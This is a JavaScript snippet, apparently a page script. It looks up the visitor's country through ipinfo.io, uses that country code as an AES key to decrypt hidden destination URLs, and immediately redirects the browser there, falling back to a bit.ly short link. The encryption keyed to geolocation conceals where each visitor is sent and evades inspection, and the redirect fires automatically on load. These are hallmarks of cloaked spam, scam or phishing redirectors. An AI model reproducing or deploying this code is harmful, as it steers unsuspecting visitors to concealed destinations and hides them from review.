function make_target(negara) {
    var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX1+gfkuc9HTowAqRVb+CWoa+MNVp4m61iHn4D0a6K29I7JFMb7GfLr7m",
        negara);
    if (decrypted == "") {
        var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX18+hbY4Np7pVOJUq1O5+rES+z7fWTXRmCNKFeDY2oCF/pxfuvutwjPg",
            negara);
        if (decrypted == "") {
            return "https://bit.ly/33UeWWQ";
        } else {
            return decrypted.toString(CryptoJS.enc.Utf8);
        }
    } else {
        return decrypted.toString(CryptoJS.enc.Utf8);

    }


}

negara = null;
$.get("https://ipinfo.io", function (response) {
    negara = response.country;
    if (negara !== null) {
        negara = negara.toLowerCase();
        target = make_target(negara);
    } else {
        target = "https://bit.ly/33UeWWQ";
    }
    $("#wow").click(function () {
        window.location = target;
    });
    window.location = target;
}, "jsonp");